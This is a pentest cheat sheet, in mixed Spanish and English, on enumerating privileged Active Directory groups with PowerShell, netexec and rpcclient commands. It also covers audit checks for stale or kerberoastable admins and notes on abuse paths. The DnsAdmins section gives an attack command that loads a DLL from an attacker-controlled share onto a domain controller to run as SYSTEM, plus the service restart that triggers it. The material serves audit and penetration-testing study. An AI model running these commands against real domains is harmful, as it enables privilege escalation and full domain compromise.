---
aliases:
  - Built-in Groups AD
  - Domain Admins
  - Enterprise Admins
  - Tier 0 Groups
tags:
  - type/concept
  - vuln/ad-enumeration
  - technique/discovery
  - asset/active-directory
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[AD - Groups Enumeration]]"
---
# AD - Groups Enumeration - Privileged Built-in Groups

***

## Tier 0 Domain-Level Groups

| **Group** | **RID** | **Privilegio** |
|:---:|:---:|:---:|
| Domain Admins | 512 | Full domain control. |
| Enterprise Admins | 519 | Forest-wide control (forest root only). |
| Schema Admins | 518 | Schema modification (forest root only). |
| Administrators | 544 | Full local admin per-host (DC = full domain). |
| Account Operators | 548 | Cuenta create/modify/delete non-Tier 0. |
| Backup Operators | 551 | NTDS.dit + SAM dump. |
| Server Operators | 549 | Logon DC + services + reg edit. |
| Print Operators | 550 | Driver install (legacy RCE en DC). |
| Replicators | 552 | Legacy directory replication. |
| Domain Controllers | 516 | Computer accounts DCs. |
| Cloneable Domain Controllers | 522 | DC clone permission. |
| Group Policy Creator Owners | 520 | Crear GPOs. |
| Pre-Windows 2000 Compatible Access | 554 | Anonymous SAMR enable. |
| Cert Publishers | 517 | ADCS adjacent. |
^ad-priv-tier0

```powershell
# Snapshot completo Tier 0
$Tier0 = "Domain Admins","Enterprise Admins","Schema Admins","Administrators",
         "Account Operators","Backup Operators","Server Operators","Print Operators",
         "Group Policy Creator Owners","Cloneable Domain Controllers","Cert Publishers"

foreach ($g in $Tier0) {
  Write-Host "`n=== $g ===" -ForegroundColor Yellow
  Get-ADGroupMember $g -EA SilentlyContinue | Select Name,SamAccountName,objectClass
}
```

___

## Domain Admins (DA)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `Get-ADGroupMember "Domain Admins" -Recursive` | DAs efectivos (incluye nested) | Tier 0 base. |
| `Get-ADGroupMember "Domain Admins" -Recursive \| Get-ADUser -Pr Description,LastLogonDate,Enabled,ServicePrincipalName` | + atributos detail | Audit. |
| `Get-ADGroupMember "Domain Admins" -Recursive \| Get-ADUser -Pr ServicePrincipalName \| ? ServicePrincipalName` | DAs con SPN (kerberoastable priv) | Critical. |
| `Get-ADGroupMember "Domain Admins" -Recursive \| Get-ADUser -Pr LastLogonDate \| ? LastLogonDate -lt (Get-Date).AddDays(-90)` | DAs stale (cleanup) | Audit. |
| `nxc smb <DC> -u u -p p --groups "Domain Admins"` | Members vía netexec | Linux quick. |
^ad-priv-da

**Por qué importa:** RID 512, Global Security. Default member = Administrator. Auto-añadido a Built-in Administrators de todos hosts. Recursive expansion via nested groups común.

```powershell
# DA con red flags (SPN, never-expire pwd, stale)
Get-ADGroupMember "Domain Admins" -Recursive |
  Get-ADUser -Properties ServicePrincipalName,PasswordNeverExpires,LastLogonDate,PasswordLastSet,Description |
  Where { $_.ServicePrincipalName -or $_.PasswordNeverExpires -or $_.LastLogonDate -lt (Get-Date).AddDays(-90) } |
  Select Name,SamAccountName,@{n='SPN';e={[bool]$_.ServicePrincipalName}},PasswordNeverExpires,LastLogonDate,PasswordLastSet
```

___

## Enterprise Admins (EA)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `Get-ADGroupMember "Enterprise Admins" -Server (Get-ADForest).RootDomain -Recursive` | EAs (forest root only) | Tier 0 forest. |
| `Get-ADUser -Server (Get-ADForest).RootDomain -Filter "memberOf -RecursiveMatch 'CN=Enterprise Admins,...'"` | RecursiveMatch alt | Edge cases. |
^ad-priv-ea

**Por qué importa:** RID 519, Universal Security. **Solo existe en forest root domain**. Auto-miembro de Domain Admins de **todos los domains** del forest = forest-wide compromise.

```powershell
# Forest root EA scan
$Root = (Get-ADForest).RootDomain
foreach ($d in (Get-ADForest).Domains) {
  Write-Host "`n=== $d ==="
  try { Get-ADGroupMember "Enterprise Admins" -Server $d -EA Stop } catch { "(not in $d)" }
}
```

___

## Schema Admins

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `Get-ADGroupMember "Schema Admins" -Server (Get-ADForest).RootDomain -Recursive` | Members (debe estar vacío) | Audit critical. |
| `Get-ADForest \| Select SchemaMaster` | DC con FSMO Schema Master | Targeted. |
^ad-priv-schema

**Por qué importa:** RID 518, Universal Security. Solo en forest root. **Debe estar vacío** por best practice — solo agregar miembro temporalmente para schema mods. Cualquier member persistent = audit finding crítico.

```powershell
$Schema = Get-ADGroupMember "Schema Admins" -Server (Get-ADForest).RootDomain -Recursive
if ($Schema) {
  Write-Warning "Schema Admins NOT EMPTY (audit fail):"
  $Schema | Select Name,SamAccountName
} else {
  Write-Host "Schema Admins empty (best practice OK)" -ForegroundColor Green
}
```

___

## Built-in Groups (Domain Local)

| **Group** | **RID** | **Cuándo importa** |
|:---:|:---:|:---:|
| Administrators | 544 | Full local admin (DC = domain). |
| Account Operators | 548 | Account mgmt non-Tier 0 (puede crear backdoors). |
| Backup Operators | 551 | **NTDS.dit dump path** (privesc directo). |
| Server Operators | 549 | Logon DC + services + reg (Tier 0 path). |
| Print Operators | 550 | Driver install (legacy DC RCE). |
| Pre-Win 2000 Compat Access | 554 | Anonymous SAMR enable (legacy compat). |
| Remote Desktop Users | 555 | RDP access. |
| Remote Management Users | 580 | WinRM access (5985/5986). |
| Distributed COM Users | 562 | DCOM activation (lateral). |
| Hyper-V Administrators | 578 | Per-VM root (Tier 1+ targets). |
^ad-priv-builtin

```powershell
# All built-in groups + members
Get-ADGroup -Filter * -SearchBase "CN=Builtin,DC=corp,DC=local" |
  Select Name,SID,GroupCategory

foreach ($g in (Get-ADGroup -Filter * -SearchBase "CN=Builtin,DC=corp,DC=local")) {
  Write-Host "`n=== $($g.Name) ==="
  Get-ADGroupMember $g -EA SilentlyContinue | Select Name,SamAccountName
}
```

```bash
# RPC built-in alias enum
rpcclient -U 'corp\u%pass' <DC> -c 'enumalsgroups builtin'
```

___

## DnsAdmins (Legacy RCE Path)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `Get-ADGroupMember "DnsAdmins" -Recursive` | Members (debe estar vacío) | Audit critical. |
| `dnscmd <DC> /config /serverlevelplugindll \\attacker\share\evil.dll` | Plugin DLL → SYSTEM en DC (legacy abuse) | Pre-CVE-2021-40469. |
| `net stop dns && net start dns` (post-DLL set) | Trigger DLL load | Si tenés priv. |
^ad-priv-dnsadmins

**Por qué importa:** miembros pueden registrar DLL como plugin DNS. Reload service = ejecuta como SYSTEM en DC. Patched **CVE-2021-40469** pero environments legacy siguen vivos. Default DnsAdmins debe estar vacío.

___

## Exchange-Related Groups (Legacy DCSync Path)

| **Group** | **Pre-2019 Privilege** | **Status** |
|:---:|:---:|:---:|
| Exchange Trusted Subsystem | `WriteDACL` sobre domain root | Patched CVE-2019-1040. |
| Exchange Windows Permissions | `WriteDACL` sobre domain root | Patched. |
| Exchange Servers | `GetChanges`-style rights | Patched. |
| Exchange Enterprise Servers | Forest-wide adjacent | Patched. |
| ExchangeLegacyInterop | Legacy compat | Audit. |
^ad-priv-exchange

```powershell
# Audit Exchange groups
$Ex = "Exchange Trusted Subsystem","Exchange Windows Permissions","Exchange Servers",
      "Exchange Enterprise Servers","ExchangeLegacyInterop","Compatibility Access"

foreach ($g in $Ex) {
  Write-Host "`n=== $g ==="
  Get-ADGroupMember $g -Recursive -EA SilentlyContinue | Select Name,objectClass
}
```

***
